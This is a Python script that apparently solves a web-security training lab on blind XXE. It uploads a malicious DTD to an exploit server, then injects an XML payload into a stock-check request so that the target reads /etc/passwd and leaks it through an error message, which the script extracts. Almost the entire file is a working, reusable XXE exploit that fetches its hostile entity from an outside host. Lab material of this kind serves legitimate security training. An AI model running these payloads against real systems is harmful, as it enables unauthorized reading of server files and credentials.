import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting blind XXE to retrieve data via error messages"


def run(url, payload, proxies=None):
    url = url.rstrip('/')
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Store the malicious DTD file in your exploit server\n2. Inject payload into the check stock request to retrieve the content of /etc/passwd via error message\n3. Extract the first line as a proof\n""")

    headers = {"Content-Type": "application/xml"}
    print(Fore.WHITE + "Injection point: " +
          Fore.YELLOW + "Check stock request")

    # burp_input = input("[?] Enter the Burp Collaborator URL: ").strip()
    exploit_input = input("[?] Enter the exploit server URL: ").strip()
    exploit_input = exploit_input.rstrip('/')

    print(Fore.WHITE +
          "[1] Storing the malicious DTD file on your exploit server")
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8"

    malicious_file_name = "exploit.dtd"
    malicious_file = f"""<!ENTITY % file SYSTEM "file:///etc/passwd">
                            <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file:///notexist/%file;'>">
                            %eval;
                            %exfiltrate;"""

    data = {"responseFile": f"/{malicious_file_name}", "responseBody": malicious_file,
            "responseHead": response_head, "formAction": "STORE", "urlIsHttps": "on"}

    requests.post(exploit_input, data=data, allow_redirects=False,
                  verify=False, proxies=proxies)

    print(Fore.WHITE +
          "[2] Injecting payload to retrieve the content of /etc/passwd via error message")

    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{exploit_input}/{malicious_file_name}"> %xxe; ]>
                    <stockCheck>
                        <productId>
                            2
                        </productId>
                        <storeId>
                            1
                        </storeId>external entities
                        external entities
                    </stockCheck>"""

    try:
        r = requests.post(
            f"{url}/product/stock", data=payload, headers=headers, allow_redirects=False, verify=False, proxies=proxies)

        print(Fore.WHITE + "[3] Extracting the first line as a proof")
        first_line = re.findall("/(root:.*)\n", r.text)[0]
        print(Fore.GREEN + "[+] first line" + Fore.WHITE + " => " + Fore.YELLOW + first_line)

        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
